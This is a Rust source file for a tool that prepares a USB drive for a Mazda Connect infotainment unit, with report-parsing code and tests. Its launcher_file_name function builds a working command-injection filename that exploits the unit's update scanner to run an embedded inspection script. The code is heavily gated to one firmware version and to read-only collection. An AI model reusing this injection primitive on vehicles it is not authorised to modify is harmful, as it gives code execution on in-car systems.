//! Prepare a firmware-gated, report-only USB payload for a Mazda Connect CMU.
//!
//! The Mac-side preparer writes only to an existing, otherwise empty destination directory. The
//! CMU-side payload is a fixed POSIX shell script embedded in this crate; it has no arbitrary path,
//! command, persistence, remount, reboot, VIP, CAN, or LIN options.

use std::ffi::OsStr;
use std::fmt;
use std::fs::{self, OpenOptions};
use std::io::{self, Read, Write};
use std::path::{Path, PathBuf};

#[cfg(target_os = "macos")]
use std::path::Component;
#[cfg(target_os = "macos")]
use std::process::Command;

/// The only firmware family on which the USB launcher is currently allowed to run.
pub const SUPPORTED_FIRMWARE: &str = "74.00.324A";

/// A single, explicitly selected stock removable-media mount.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum CmuMount {
    Sda1,
    Sdb1,
}

impl CmuMount {
    #[must_use]
    pub const fn as_str(self) -> &'static str {
        match self {
            Self::Sda1 => "sda1",
            Self::Sdb1 => "sdb1",
        }
    }
}

impl std::str::FromStr for CmuMount {
    type Err = ();

    fn from_str(value: &str) -> Result<Self, Self::Err> {
        match value {
            "sda1" => Ok(Self::Sda1),
            "sdb1" => Ok(Self::Sdb1),
            _ => Err(()),
        }
    }
}

const COLLECTOR_FILE_NAME: &str = "cmu-inspect.sh";
const UPDATE_FLAG_FILE_NAME: &str = "jci-autoupdate";
const COLLECTOR: &[u8] = include_bytes!("../assets/cmu-inspect.sh");
const MAX_REPORT_FILE_BYTES: u64 = 1024 * 1024;

/// An error encountered before or while preparing removable media.
#[derive(Debug)]
pub enum PrepareError {
    UnsupportedFirmware,
    DestinationNotFound,
    DestinationIsSymlink,
    DestinationNotDirectory,
    DestinationTooBroad,
    DestinationOutsideMacVolumes,
    DestinationNotFat32,
    DestinationNotRemovable,
    DestinationNotMbr,
    DestinationNotEmpty(String),
    UnexpectedPostWriteEntry(String),
    Io {
        action: &'static str,
        path: PathBuf,
        source: io::Error,
    },
}

impl fmt::Display for PrepareError {
    fn fmt(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::UnsupportedFirmware => write!(
                formatter,
                "firmware must be explicitly confirmed as {SUPPORTED_FIRMWARE}"
            ),
            Self::DestinationNotFound => write!(formatter, "destination does not exist"),
            Self::DestinationIsSymlink => {
                write!(formatter, "destination must not be a symbolic link")
            }
            Self::DestinationNotDirectory => write!(formatter, "destination is not a directory"),
            Self::DestinationTooBroad => {
                write!(formatter, "refusing a filesystem root destination")
            }
            Self::DestinationOutsideMacVolumes => write!(
                formatter,
                "on macOS, destination must be a mounted volume root under /Volumes"
            ),
            Self::DestinationNotFat32 => {
                write!(formatter, "destination volume is not FAT32 (msdos)")
            }
            Self::DestinationNotRemovable => {
                write!(formatter, "destination volume is not removable media")
            }
            Self::DestinationNotMbr => {
                write!(formatter, "destination disk does not use an MBR partition map")
            }
            Self::DestinationNotEmpty(name) => write!(
                formatter,
                "destination contains non-macOS-metadata entry {name:?}; use a blank FAT32 drive"
            ),
            Self::UnexpectedPostWriteEntry(name) => write!(
                formatter,
                "unexpected entry {name:?} appeared while preparing the drive; payload was rolled back"
            ),
            Self::Io {
                action,
                path,
                source,
            } => write!(formatter, "could not {action} {}: {source}", path.display()),
        }
    }
}

impl std::error::Error for PrepareError {
    fn source(&self) -> Option<&(dyn std::error::Error + 'static)> {
        match self {
            Self::Io { source, .. } => Some(source),
            _ => None,
        }
    }
}

/// Evidence from a completed phase-one report that is relevant to a later USB-Ethernet probe.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ReportAnalysis {
    pub firmware: String,
    pub available_usb_network_drivers: Vec<UsbNetworkDriver>,
    pub loaded_usb_network_modules: Vec<String>,
    pub observed_non_vehicle_interfaces: Vec<String>,
    pub busybox_applets: Vec<String>,
}

/// USB-network driver families relevant to a host-safe Mac transport.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum UsbNetworkDriver {
    Asix,
    CdcEther,
    CdcNcm,
}

impl ReportAnalysis {
    /// Whether the report contains enough evidence to justify a passive USB-Ethernet adapter probe.
    ///
    /// This does not authorize loading a module or configuring an interface.
    #[must_use]
    pub const fn supports_passive_adapter_probe(&self) -> bool {
        !self.available_usb_network_drivers.is_empty()
    }

    #[must_use]
    pub fn has_busybox_applet(&self, applet: &str) -> bool {
        self.busybox_applets.iter().any(|item| item == applet)
    }
}

/// An error encountered while validating a report copied back to the Mac.
#[derive(Debug)]
pub enum AnalyzeError {
    ReportNotFound,
    ReportNotDirectory,
    MissingFile(&'static str),
    OversizedFile(&'static str),
    InvalidFileType(&'static str),
    InvalidSchema,
    IncompleteReport,
    UnsupportedFirmware(String),
    Io {
        action: &'static str,
        path: PathBuf,
        source: io::Error,
    },
}

impl fmt::Display for AnalyzeError {
    fn fmt(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::ReportNotFound => write!(formatter, "report directory does not exist"),
            Self::ReportNotDirectory => write!(formatter, "report path is not a directory"),
            Self::MissingFile(name) => write!(formatter, "report is missing {name}"),
            Self::OversizedFile(name) => write!(formatter, "report file {name} exceeds 1 MiB"),
            Self::InvalidFileType(name) => {
                write!(formatter, "report file {name} is not a regular file")
            }
            Self::InvalidSchema => write!(formatter, "report manifest schema is not supported"),
            Self::IncompleteReport => {
                write!(formatter, "report does not end with a complete record")
            }
            Self::UnsupportedFirmware(firmware) => write!(
                formatter,
                "report is from unsupported firmware {firmware:?}, expected {SUPPORTED_FIRMWARE}"
            ),
            Self::Io {
                action,
                path,
                source,
            } => write!(formatter, "could not {action} {}: {source}", path.display()),
        }
    }
}

impl std::error::Error for AnalyzeError {
    fn source(&self) -> Option<&(dyn std::error::Error + 'static)> {
        match self {
            Self::Io { source, .. } => Some(source),
            _ => None,
        }
    }
}

/// Writes the three-file report payload into an existing blank removable-media directory.
///
/// `confirmed_firmware` must exactly match [`SUPPORTED_FIRMWARE`]. Existing files are never
/// overwritten, and a partial preparation is rolled back if a later file cannot be created.
///
/// # Errors
///
/// Returns an error when the firmware was not explicitly confirmed, the destination is unsafe or
/// non-empty, or any payload file cannot be created and flushed.
pub fn prepare_usb(
    destination: &Path,
    confirmed_firmware: &str,
    cmu_mount: CmuMount,
) -> Result<(), PrepareError> {
    if confirmed_firmware != SUPPORTED_FIRMWARE {
        return Err(PrepareError::UnsupportedFirmware);
    }

    let metadata = fs::symlink_metadata(destination).map_err(|error| {
        if error.kind() == io::ErrorKind::NotFound {
            PrepareError::DestinationNotFound
        } else {
            io_error("inspect", destination, error)
        }
    })?;
    if metadata.file_type().is_symlink() {
        return Err(PrepareError::DestinationIsSymlink);
    }
    if !metadata.is_dir() {
        return Err(PrepareError::DestinationNotDirectory);
    }
    if destination.parent().is_none() {
        return Err(PrepareError::DestinationTooBroad);
    }

    #[cfg(target_os = "macos")]
    verify_macos_volume(destination)?;

    let entries =
        fs::read_dir(destination).map_err(|error| io_error("list", destination, error))?;
    for entry in entries {
        let entry = entry.map_err(|error| io_error("list", destination, error))?;
        if !is_ignorable_macos_metadata(&entry.file_name()) {
            return Err(PrepareError::DestinationNotEmpty(
                entry.file_name().to_string_lossy().into_owned(),
            ));
        }
    }

    let launcher_file_name = launcher_file_name(cmu_mount);
    let payloads: [(&str, &[u8]); 3] = [
        (COLLECTOR_FILE_NAME, COLLECTOR),
        (UPDATE_FLAG_FILE_NAME, b"\n"),
        (&launcher_file_name, b"\n"),
    ];
    let mut created = Vec::with_capacity(payloads.len());

    for (name, content) in payloads {
        let path = destination.join(name);
        if let Err(error) = create_new_file(&path, content) {
            let _ = fs::remove_file(&path);
            rollback_created_files(&created);
            return Err(io_error("create payload file", &path, error));
        }
        created.push(path);
    }

    if let Err(error) = verify_prepared_entries(destination, &launcher_file_name) {
        rollback_created_files(&created);
        return Err(error);
    }

    Ok(())
}

fn verify_prepared_entries(destination: &Path, launcher: &str) -> Result<(), PrepareError> {
    let entries = fs::read_dir(destination)
        .map_err(|error| io_error("verify prepared drive", destination, error))?;
    for entry in entries {
        let entry = entry.map_err(|error| io_error("verify prepared drive", destination, error))?;
        let name = entry.file_name();
        let is_payload = name == OsStr::new(COLLECTOR_FILE_NAME)
            || name == OsStr::new(UPDATE_FLAG_FILE_NAME)
            || name == OsStr::new(launcher);
        if !is_payload && !is_ignorable_macos_metadata(&name) {
            return Err(PrepareError::UnexpectedPostWriteEntry(
                name.to_string_lossy().into_owned(),
            ));
        }
    }
    Ok(())
}

/// Builds the one command-injection filename used by the vulnerable Gen-6.5 update scanner.
///
/// This implementation is independently derived from ZDI's published filename-injection
/// primitive. FAT disallows a literal `/`, so standard shell built-ins derive `/` by moving from
/// `HOME` to its parent. Unlike community launchers, this names exactly one caller-selected mount
/// and contains no mount-search loop or arbitrary command input.
#[must_use]
pub fn launcher_file_name(cmu_mount: CmuMount) -> String {
    format!(
        "$(R=$(cd ${{HOME}};cd ..;pwd);sh ${{R}}tmp${{R}}mnt${{R}}{}${{R}}cmu-inspect.sh).up",
        cmu_mount.as_str()
    )
}

/// Validates and analyzes a completed `mazda-cmu-report` directory.
///
/// The analyzer is read-only and caps every report file at 1 MiB before reading it. Its transport
/// result is evidence for a later passive hardware probe, not permission to alter CMU networking.
///
/// # Errors
///
/// Returns an error when the report is missing, malformed, incomplete, oversized, unreadable, or
/// from any firmware other than [`SUPPORTED_FIRMWARE`].
pub fn analyze_report(report_directory: &Path) -> Result<ReportAnalysis, AnalyzeError> {
    let metadata = fs::metadata(report_directory).map_err(|error| {
        if error.kind() == io::ErrorKind::NotFound {
            AnalyzeError::ReportNotFound
        } else {
            analyze_io_error("inspect", report_directory, error)
        }
    })?;
    if !metadata.is_dir() {
        return Err(AnalyzeError::ReportNotDirectory);
    }

    let manifest = read_required_report_file(report_directory, "manifest.tsv")?;
    let mut manifest_lines = manifest.lines();
    if manifest_lines.next() != Some("mazda-cmu-report\t1")
        || manifest_lines.next() != Some("source\tstatus\tbytes")
    {
        return Err(AnalyzeError::InvalidSchema);
    }
    if manifest.lines().last() != Some("result\tcomplete") {
        return Err(AnalyzeError::IncompleteReport);
    }

    let firmware_file = read_required_report_file(report_directory, "firmware-version.ini")?;
    let firmware = parse_firmware(&firmware_file).ok_or(AnalyzeError::InvalidSchema)?;
    if firmware != "74.00.324" && firmware != SUPPORTED_FIRMWARE {
        return Err(AnalyzeError::UnsupportedFirmware(firmware));
    }

    let module_files = read_successful_observation(
        report_directory,
        &manifest,
        "module-files/usb-network",
        "usb-network-modules.txt",
    )?;
    let loaded_modules =
        read_successful_observation(report_directory, &manifest, "proc/modules", "modules.txt")?;
    let network_devices = read_successful_observation(
        report_directory,
        &manifest,
        "proc/net/dev",
        "network-devices.txt",
    )?;
    let busybox_applets = read_successful_observation(
        report_directory,
        &manifest,
        "busybox-applets",
        "busybox-applets.txt",
    )?;

    let mut available_usb_network_drivers = Vec::new();
    for (module, driver) in [
        ("asix", UsbNetworkDriver::Asix),
        ("cdc_ether", UsbNetworkDriver::CdcEther),
        ("cdc_ncm", UsbNetworkDriver::CdcNcm),
    ] {
        if module_is_available(&module_files, &loaded_modules, module) {
            available_usb_network_drivers.push(driver);
        }
    }

    Ok(ReportAnalysis {
        firmware,
        available_usb_network_drivers,
        loaded_usb_network_modules: parse_loaded_usb_network_modules(&loaded_modules),
        observed_non_vehicle_interfaces: parse_non_vehicle_interfaces(&network_devices),
        busybox_applets: parse_exact_lines(&busybox_applets),
    })
}

fn create_new_file(path: &Path, content: &[u8]) -> io::Result<()> {
    let mut file = OpenOptions::new().write(true).create_new(true).open(path)?;
    file.write_all(content)?;
    file.sync_all()
}

fn rollback_created_files(created: &[PathBuf]) {
    for path in created.iter().rev() {
        let _ = fs::remove_file(path);
    }
}

fn is_ignorable_macos_metadata(name: &OsStr) -> bool {
    matches!(
        name.to_str(),
        Some(".fseventsd" | ".Spotlight-V100" | ".Trashes")
    )
}

fn io_error(action: &'static str, path: &Path, source: io::Error) -> PrepareError {
    PrepareError::Io {
        action,
        path: path.to_owned(),
        source,
    }
}

fn analyze_io_error(action: &'static str, path: &Path, source: io::Error) -> AnalyzeError {
    AnalyzeError::Io {
        action,
        path: path.to_owned(),
        source,
    }
}

fn read_required_report_file(
    report_directory: &Path,
    name: &'static str,
) -> Result<String, AnalyzeError> {
    let path = report_directory.join(name);
    if !path.exists() {
        return Err(AnalyzeError::MissingFile(name));
    }
    read_report_file(&path, name)
}

fn read_optional_report_file(
    report_directory: &Path,
    name: &'static str,
) -> Result<String, AnalyzeError> {
    let path = report_directory.join(name);
    if !path.exists() {
        return Ok(String::new());
    }
    read_report_file(&path, name)
}

fn read_successful_observation(
    report_directory: &Path,
    manifest: &str,
    source: &str,
    file_name: &'static str,
) -> Result<String, AnalyzeError> {
    let status = manifest.lines().find_map(|line| {
        let mut fields = line.split('\t');
        if fields.next() == Some(source) {
            fields.next()
        } else {
            None
        }
    });
    if !matches!(status, Some("ok" | "truncated")) {
        return Ok(String::new());
    }
    read_optional_report_file(report_directory, file_name)
}

fn read_report_file(path: &Path, name: &'static str) -> Result<String, AnalyzeError> {
    let metadata =
        fs::symlink_metadata(path).map_err(|error| analyze_io_error("inspect", path, error))?;
    if !metadata.is_file() || metadata.file_type().is_symlink() {
        return Err(AnalyzeError::InvalidFileType(name));
    }
    if metadata.len() > MAX_REPORT_FILE_BYTES {
        return Err(AnalyzeError::OversizedFile(name));
    }

    let file = fs::File::open(path).map_err(|error| analyze_io_error("open", path, error))?;
    let mut bytes = Vec::new();
    file.take(MAX_REPORT_FILE_BYTES + 1)
        .read_to_end(&mut bytes)
        .map_err(|error| analyze_io_error("read", path, error))?;
    if u64::try_from(bytes.len()).expect("report byte count fits in u64") > MAX_REPORT_FILE_BYTES {
        return Err(AnalyzeError::OversizedFile(name));
    }

    Ok(String::from_utf8_lossy(&bytes).into_owned())
}

fn parse_firmware(version_file: &str) -> Option<String> {
    let value = version_file
        .lines()
        .find_map(|line| line.strip_prefix("JCI_SW_VER="))?
        .trim_end_matches('\r')
        .trim_matches('"');
    value.rsplit('_').next().map(str::to_owned)
}

fn module_is_available(module_files: &str, loaded_modules: &str, module: &str) -> bool {
    loaded_modules
        .lines()
        .any(|line| line.split_whitespace().next() == Some(module))
        || module_files.lines().any(|line| {
            let file_name = line.rsplit('/').next().unwrap_or(line);
            [
                format!("{module}.ko"),
                format!("{module}.ko.gz"),
                format!("{module}.ko.xz"),
            ]
            .iter()
            .any(|candidate| file_name == candidate)
        })
}

fn parse_non_vehicle_interfaces(network_devices: &str) -> Vec<String> {
    let mut interfaces = network_devices
        .lines()
        .filter_map(|line| line.split_once(':').map(|(name, _)| name.trim()))
        .filter(|name| {
            !name.is_empty()
                && *name != "lo"
                && !name.starts_with("can")
                && !name.starts_with("vcan")
                && !name.starts_with("slcan")
                && name
                    .chars()
                    .all(|character| character.is_ascii_alphanumeric() || "_.-".contains(character))
        })
        .map(str::to_owned)
        .collect::<Vec<_>>();
    interfaces.sort_unstable();
    interfaces.dedup();
    interfaces
}

fn parse_loaded_usb_network_modules(loaded_modules: &str) -> Vec<String> {
    let mut modules = loaded_modules
        .lines()
        .filter_map(|line| line.split_whitespace().next())
        .filter(|module| matches!(*module, "usbnet" | "asix" | "cdc_ether" | "cdc_ncm"))
        .map(str::to_owned)
        .collect::<Vec<_>>();
    modules.sort_unstable();
    modules.dedup();
    modules
}

fn parse_exact_lines(content: &str) -> Vec<String> {
    let mut lines = content
        .lines()
        .map(str::trim)
        .filter(|line| !line.is_empty())
        .map(str::to_owned)
        .collect::<Vec<_>>();
    lines.sort_unstable();
    lines.dedup();
    lines
}

#[cfg(target_os = "macos")]
fn verify_macos_volume(destination: &Path) -> Result<(), PrepareError> {
    let mut components = destination.components();
    let is_volume_root = matches!(components.next(), Some(Component::RootDir))
        && matches!(components.next(), Some(Component::Normal(name)) if name == "Volumes")
        && matches!(components.next(), Some(Component::Normal(_)))
        && components.next().is_none();
    if !is_volume_root {
        return Err(PrepareError::DestinationOutsideMacVolumes);
    }

    let output = Command::new("/usr/sbin/diskutil")
        .args(["info", "-plist"])
        .arg(destination)
        .output()
        .map_err(|error| io_error("inspect volume with diskutil", destination, error))?;
    if !output.status.success() {
        return Err(io_error(
            "inspect volume with diskutil",
            destination,
            io::Error::other("diskutil returned a failure status"),
        ));
    }

    let volume_plist = String::from_utf8_lossy(&output.stdout);
    let parent_disk = plist_string_value(&volume_plist, "ParentWholeDisk")
        .ok_or(PrepareError::DestinationNotMbr)?;

    let disk_output = Command::new("/usr/sbin/diskutil")
        .args(["list", "-plist", parent_disk])
        .output()
        .map_err(|error| io_error("inspect partition map with diskutil", destination, error))?;
    if !disk_output.status.success() {
        return Err(io_error(
            "inspect partition map with diskutil",
            destination,
            io::Error::other("diskutil returned a failure status"),
        ));
    }

    validate_macos_volume_plists(&volume_plist, &String::from_utf8_lossy(&disk_output.stdout))
}

#[cfg(any(target_os = "macos", test))]
fn plist_value_starts_with(plist: &str, key: &str, expected_value: &str) -> bool {
    let marker = format!("<key>{key}</key>");
    plist
        .split_once(&marker)
        .is_some_and(|(_, remainder)| remainder.trim_start().starts_with(expected_value))
}

#[cfg(any(target_os = "macos", test))]
fn plist_string_value<'a>(plist: &'a str, key: &str) -> Option<&'a str> {
    let marker = format!("<key>{key}</key>");
    let (_, remainder) = plist.split_once(&marker)?;
    let remainder = remainder.trim_start().strip_prefix("<string>")?;
    remainder.split_once("</string>").map(|(value, _)| value)
}

#[cfg(any(target_os = "macos", test))]
fn validate_macos_volume_plists(
    volume_plist: &str,
    whole_disk_plist: &str,
) -> Result<(), PrepareError> {
    let filesystem_type = plist_string_value(volume_plist, "FilesystemType");
    let filesystem_name = plist_string_value(volume_plist, "FilesystemName");
    if filesystem_type != Some("msdos")
        || !filesystem_name.is_some_and(|name| name.to_ascii_uppercase().contains("FAT32"))
    {
        return Err(PrepareError::DestinationNotFat32);
    }
    if !plist_value_starts_with(volume_plist, "RemovableMedia", "<true/>") {
        return Err(PrepareError::DestinationNotRemovable);
    }
    if plist_string_value(whole_disk_plist, "Content") != Some("FDisk_partition_scheme") {
        return Err(PrepareError::DestinationNotMbr);
    }

    Ok(())
}

#[cfg(test)]
mod tests {
    use std::process::Command;
    use std::time::{SystemTime, UNIX_EPOCH};

    use super::*;

    struct TestDirectory(PathBuf);

    impl TestDirectory {
        fn new(label: &str) -> Self {
            let unique = SystemTime::now()
                .duration_since(UNIX_EPOCH)
                .expect("clock is after Unix epoch")
                .as_nanos();
            let path = std::env::temp_dir().join(format!(
                "mazda-cmu-inspect-{label}-{}-{unique}",
                std::process::id()
            ));
            fs::create_dir_all(&path).expect("create test directory");
            Self(path)
        }

        fn write(&self, relative: &str, content: &[u8]) {
            let path = self.0.join(relative);
            fs::create_dir_all(path.parent().expect("fixture has a parent"))
                .expect("create fixture parent");
            fs::write(path, content).expect("write fixture");
        }
    }

    impl Drop for TestDirectory {
        fn drop(&mut self) {
            fs::remove_dir_all(&self.0).expect("remove test directory");
        }
    }

    #[test]
    fn prepares_exact_payload_without_overwriting() {
        let usb = TestDirectory::new("prepare");

        prepare_usb(&usb.0, SUPPORTED_FIRMWARE, CmuMount::Sda1).expect("prepare payload");

        assert_eq!(
            fs::read(usb.0.join(COLLECTOR_FILE_NAME)).expect("read collector"),
            COLLECTOR
        );
        assert_eq!(
            fs::read(usb.0.join(UPDATE_FLAG_FILE_NAME)).expect("read flag"),
            b"\n"
        );
        let launcher = launcher_file_name(CmuMount::Sda1);
        assert!(usb.0.join(&launcher).is_file());
        assert!(matches!(
            prepare_usb(&usb.0, SUPPORTED_FIRMWARE, CmuMount::Sda1),
            Err(PrepareError::DestinationNotEmpty(_))
        ));
    }

    #[test]
    fn launcher_name_is_a_single_valid_fat_component() {
        let launcher = launcher_file_name(CmuMount::Sdb1);
        assert!(launcher.len() <= 255);
        assert!(!launcher.chars().any(|character| matches!(
            character,
            '<' | '>' | ':' | '"' | '/' | '\\' | '|' | '?' | '*'
        )));
        assert!(Path::new(&launcher)
            .extension()
            .is_some_and(|extension| extension.eq_ignore_ascii_case("up")));
        assert!(launcher.contains("sdb1"));
        assert!(launcher.contains("cmu-inspect.sh"));
        assert!(!launcher.contains("for "));
        assert!(!launcher.contains("HOME%root"));
    }

    #[test]
    fn diskutil_plists_require_fat32_removable_media_and_mbr() {
        let volume = r"
            <plist><dict>
            <key>FilesystemType</key><string>msdos</string>
            <key>FilesystemName</key><string>MS-DOS FAT32</string>
            <key>ParentWholeDisk</key><string>disk7</string>
            <key>RemovableMedia</key><true/>
            </dict></plist>
        ";
        let mbr = r"
            <plist><dict><key>AllDisksAndPartitions</key><array><dict>
            <key>Content</key><string>FDisk_partition_scheme</string>
            </dict></array></dict></plist>
        ";
        assert!(validate_macos_volume_plists(volume, mbr).is_ok());

        let fat16 = volume.replace("FAT32", "FAT16");
        assert!(matches!(
            validate_macos_volume_plists(&fat16, mbr),
            Err(PrepareError::DestinationNotFat32)
        ));
        let fixed = volume.replace("<true/>", "<false/>");
        assert!(matches!(
            validate_macos_volume_plists(&fixed, mbr),
            Err(PrepareError::DestinationNotRemovable)
        ));
        let guid = mbr.replace("FDisk_partition_scheme", "GUID_partition_scheme");
        assert!(matches!(
            validate_macos_volume_plists(volume, &guid),
            Err(PrepareError::DestinationNotMbr)
        ));
    }

    #[test]
    fn refuses_unconfirmed_firmware_before_writing() {
        let usb = TestDirectory::new("firmware");

        let result = prepare_usb(&usb.0, "70.00.100A", CmuMount::Sda1);

        assert!(matches!(result, Err(PrepareError::UnsupportedFirmware)));
        assert_eq!(fs::read_dir(&usb.0).expect("list USB").count(), 0);
    }

    #[test]
    fn collector_is_firmware_gated_bounded_and_usb_only() {
        let usb = TestDirectory::new("collector-usb");
        let root = TestDirectory::new("collector-root");
        prepare_usb(&usb.0, SUPPORTED_FIRMWARE, CmuMount::Sda1).expect("prepare payload");
        root.write(
            "jci/version.ini",
            b"JCI_SW_VER=\"cmu150_NA_74.00.324\"\r\nJCI_SW_VER_PATCH=\"A\"\r\n",
        );
        root.write("proc/version", b"Linux fixture\n");
        root.write("proc/cpuinfo", &vec![b'x'; 256 * 1024 + 4096]);
        root.write(
            "lib/modules/3.0.35/kernel/drivers/net/usb/asix.ko",
            b"fixture module",
        );
        root.write(
            "proc/net/dev",
            b"Inter-| Receive | Transmit\n  lo: 0 0\neth0: 1 2\ncan0: 3 4\n",
        );
        root.write("persistent/sentinel", b"unchanged");

        let output = Command::new("sh")
            .arg(usb.0.join(COLLECTOR_FILE_NAME))
            .env("MAZDA_CMU_INSPECT_TESTING", "1")
            .env("MAZDA_CMU_INSPECT_TEST_ROOT", &root.0)
            .env("MAZDA_CMU_INSPECT_TEST_USB", &usb.0)
            .output()
            .expect("run collector");

        assert!(output.status.success());
        assert!(output.stdout.is_empty());
        assert!(output.stderr.is_empty());
        let report = usb.0.join("mazda-cmu-report");
        assert_eq!(
            fs::read(report.join("kernel-version.txt")).expect("read captured kernel"),
            b"Linux fixture\n"
        );
        assert_eq!(
            fs::metadata(report.join("cpuinfo.txt"))
                .expect("stat captured CPU info")
                .len(),
            256 * 1024
        );
        let manifest = fs::read_to_string(report.join("manifest.tsv")).expect("read manifest");
        assert!(manifest.contains("proc/cpuinfo\ttruncated\t262144"));
        assert_eq!(
            fs::read_to_string(report.join("usb-network-modules.txt"))
                .expect("read USB network modules"),
            "lib/modules/3.0.35/kernel/drivers/net/usb/asix.ko\n"
        );
        let analysis = analyze_report(&report).expect("analyze report");
        assert_eq!(analysis.firmware, "74.00.324");
        assert_eq!(
            analysis.available_usb_network_drivers,
            [UsbNetworkDriver::Asix]
        );
        assert_eq!(analysis.observed_non_vehicle_interfaces, ["eth0"]);
        assert_eq!(
            fs::read(root.0.join("persistent/sentinel")).expect("read sentinel"),
            b"unchanged"
        );
    }

    #[test]
    fn collector_refuses_other_firmware_without_creating_report() {
        let usb = TestDirectory::new("refusal-usb");
        let root = TestDirectory::new("refusal-root");
        prepare_usb(&usb.0, SUPPORTED_FIRMWARE, CmuMount::Sda1).expect("prepare payload");
        root.write("jci/version.ini", b"JCI_SW_VER=\"cmu150_NA_74.00.331\"\n");

        let output = Command::new("sh")
            .arg(usb.0.join(COLLECTOR_FILE_NAME))
            .env("MAZDA_CMU_INSPECT_TESTING", "1")
            .env("MAZDA_CMU_INSPECT_TEST_ROOT", &root.0)
            .env("MAZDA_CMU_INSPECT_TEST_USB", &usb.0)
            .output()
            .expect("run collector");

        assert!(!output.status.success());
        assert!(!usb.0.join("mazda-cmu-report").exists());
    }

    #[test]
    fn analyzer_refuses_incomplete_report() {
        let report = TestDirectory::new("incomplete-report");
        report.write(
            "manifest.tsv",
            b"mazda-cmu-report\t1\nsource\tstatus\tbytes\n",
        );
        report.write(
            "firmware-version.ini",
            b"JCI_SW_VER=\"cmu150_NA_74.00.324\"\n",
        );

        assert!(matches!(
            analyze_report(&report.0),
            Err(AnalyzeError::IncompleteReport)
        ));
    }
}
